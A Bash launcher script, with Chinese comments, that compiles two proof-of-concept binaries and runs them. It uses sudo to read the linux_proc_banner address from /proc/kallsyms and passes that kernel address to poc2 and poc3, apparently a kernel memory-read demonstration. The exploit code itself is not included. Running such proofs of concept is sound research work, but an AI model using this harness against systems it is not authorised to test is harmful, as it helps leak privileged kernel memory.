#!/usr/bin/env bash
set -euo pipefail

# === 配置 & 帮助 ===
DEFAULT_ARG1=10
DEFAULT_ARG2=400

usage() {
  cat <<'EOF'
用法:
  ./run.sh [ARG1] [ARG2]

说明:
  1) 自动 make
  2) 解析 /proc/kallsyms 中的 linux_proc_banner 地址
  3) 依次执行:
       ./poc2 <addr> 0
       ./poc2 <addr> 1
       ./poc3 <addr> ARG1 ARG2
  ARG1, ARG2 若不提供则默认 10, 400

可选:
  通过环境变量 ADDRESS 覆盖自动解析的地址:
    ADDRESS=ffffffff81a00060 ./run.sh
EOF
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

ARG1="${1:-$DEFAULT_ARG1}"
ARG2="${2:-$DEFAULT_ARG2}"

# === 步骤 1: 编译 ===
echo "[*] Step 1/4: make"
make

# 确认可执行文件存在
for bin in poc2 poc3; do
  if [[ ! -x "./${bin}" ]]; then
    echo "[!] 找不到或不可执行: ./${bin}  — 请检查 Makefile 的产物名称" >&2
    exit 1
  fi
done

# === 步骤 2: 解析地址 ===
get_address() {
  # 允许通过环境变量 ADDRESS 覆盖
  if [[ -n "${ADDRESS:-}" ]]; then
    echo "${ADDRESS}"
    return 0
  fi

  # 需要 root 权限读取部分系统的 /proc/kallsyms
  # 样例行: ffffffff81a00060 R linux_proc_banner
  local line addr
  if ! line="$(sudo grep -w 'linux_proc_banner' /proc/kallsyms | head -n1)"; then
    echo "[!] 无法从 /proc/kallsyms 中解析 linux_proc_banner (需要 sudo)" >&2
    return 1
  fi

  # 取第一列为地址
  addr="$(awk '{print $1}' <<<"$line")"

  # 规范化为小写不带 0x 的 16 进制
  addr="${addr#0x}"
  addr="$(tr 'A-F' 'a-f' <<<"$addr")"

  # 基本校验
  if [[ -z "$addr" || ! "$addr" =~ ^[0-9a-f]+$ ]]; then
    echo "[!] 解析到的地址无效: '$addr' (原始行为: $line)" >&2
    return 1
  fi

  echo "$addr"
}

echo "[*] Step 2/4: 解析 linux_proc_banner 地址"
ADDR="$(get_address)"
echo "[+] 解析到地址: ${ADDR}"

# === 步骤 3: 依次运行 poc2 ===
echo "[*] Step 3/4: 运行 poc2 (flag=0)"
set -x
./poc2 "${ADDR}" 0
set +x

echo "[*] Step 3/4: 运行 poc2 (flag=1)"
set -x
./poc2 "${ADDR}" 1
set +x

# === 步骤 4: 运行 poc3，参数可传入 ===
echo "[*] Step 4/4: 运行 poc3 (ARG1=${ARG1}, ARG2=${ARG2})"
set -x
./poc3 "${ADDR}" "${ARG1}" "${ARG2}"
set +x

echo "[✓] 全部步骤完成。"
